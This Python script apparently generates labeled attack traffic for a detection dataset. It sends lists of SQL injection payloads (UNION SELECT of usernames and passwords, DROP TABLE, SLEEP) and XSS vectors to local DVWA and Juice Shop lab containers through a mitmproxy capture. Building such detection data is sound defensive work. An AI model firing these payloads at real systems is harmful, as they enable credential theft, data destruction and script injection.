"""
topup_sqli_xss.py

Sends additional SQLi and XSS traffic only, with higher repeat counts,
to close the gap left after the first generate_attack_traffic.py run
(sqli landed at 67/100 sent, xss at 62/75 sent -- both below the 100+
target because some encoded/obfuscated payloads evade the plaintext
regex used for heuristic labeling).

Run this with the same prerequisites as generate_attack_traffic.py:
Docker containers up, venv active, mitmdump running,
_test_session_state.json already created by setup_test_accounts.py.
"""

import json
import os
import random
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

JUICE_SHOP_BASE = "http://localhost:3000"
DVWA_BASE = "http://localhost:8081"

SESSION_STATE_PATH = os.path.join("data", "captured_traffic", "_test_session_state.json")

MIN_DELAY = 0.15
MAX_DELAY = 0.5


def sleep_briefly():
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))


def load_session_state():
    with open(SESSION_STATE_PATH, "r", encoding="utf-8") as f:
        return json.load(f)


SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "admin' #",
    "' UNION SELECT null,null--",
    "' UNION SELECT username, password FROM users--",
    "'; DROP TABLE users--",
    "' OR 1=1--",
    "1' AND '1'='1",
    "' OR 'a'='a",
    "'/**/OR/**/1=1",
    "' OR SLEEP(5)--",
    "1 OR 1=1",
    "'||'1'='1",
    "' OR '1'='1'/*",
    "\" OR \"1\"=\"1",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert(1)>",
    "<ScRiPt>alert(1)</sCriPt>",
    "'\"--></style></script><script>alert(1)</script>",
    "<a href=javascript:alert(1)>click</a>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
]


def topup_sqli(dvwa_cookies, dvwa_reps=6, juice_reps=2):
    print("\n=== Topping up SQLi traffic ===")
    count = 0
    for payload in SQLI_PAYLOADS:
        for _ in range(dvwa_reps):
            try:
                requests.get(
                    f"{DVWA_BASE}/vulnerabilities/sqli/",
                    params={"id": payload, "Submit": "Submit"},
                    cookies=dvwa_cookies,
                    proxies=PROXIES,
                    verify=False,
                    timeout=10,
                )
                count += 1
            except requests.RequestException as e:
                print(f"  [DVWA sqli] failed: {e}")
            sleep_briefly()

    for payload in SQLI_PAYLOADS:
        for _ in range(juice_reps):
            try:
                requests.get(
                    f"{JUICE_SHOP_BASE}/rest/products/search",
                    params={"q": payload},
                    proxies=PROXIES,
                    verify=False,
                    timeout=10,
                )
                count += 1
            except requests.RequestException as e:
                print(f"  [Juice Shop search sqli] failed: {e}")
            sleep_briefly()

    print(f"SQLi top-up requests sent: {count}")
    return count


def topup_xss(dvwa_cookies, dvwa_reps=5, juice_reps=2):
    print("\n=== Topping up XSS traffic ===")
    count = 0
    for payload in XSS_PAYLOADS:
        for _ in range(dvwa_reps):
            try:
                requests.get(
                    f"{DVWA_BASE}/vulnerabilities/xss_r/",
                    params={"name": payload},
                    cookies=dvwa_cookies,
                    proxies=PROXIES,
                    verify=False,
                    timeout=10,
                )
                count += 1
            except requests.RequestException as e:
                print(f"  [DVWA xss_r] failed: {e}")
            sleep_briefly()

    for payload in XSS_PAYLOADS:
        for _ in range(juice_reps):
            try:
                requests.get(
                    f"{JUICE_SHOP_BASE}/rest/products/search",
                    params={"q": payload},
                    proxies=PROXIES,
                    verify=False,
                    timeout=10,
                )
                count += 1
            except requests.RequestException as e:
                print(f"  [Juice Shop search xss] failed: {e}")
            sleep_briefly()

    print(f"XSS top-up requests sent: {count}")
    return count


def main():
    state = load_session_state()
    dvwa_cookies = state["dvwa"]["cookies"]

    total = 0
    total += topup_sqli(dvwa_cookies)
    total += topup_xss(dvwa_cookies)

    print(f"\nDone. Total top-up requests sent: {total}")
    print("Now stop mitmdump (Ctrl+C) and re-run scripts/extract_features.py "
          "to check the updated label distribution.")


if __name__ == "__main__":
    main()
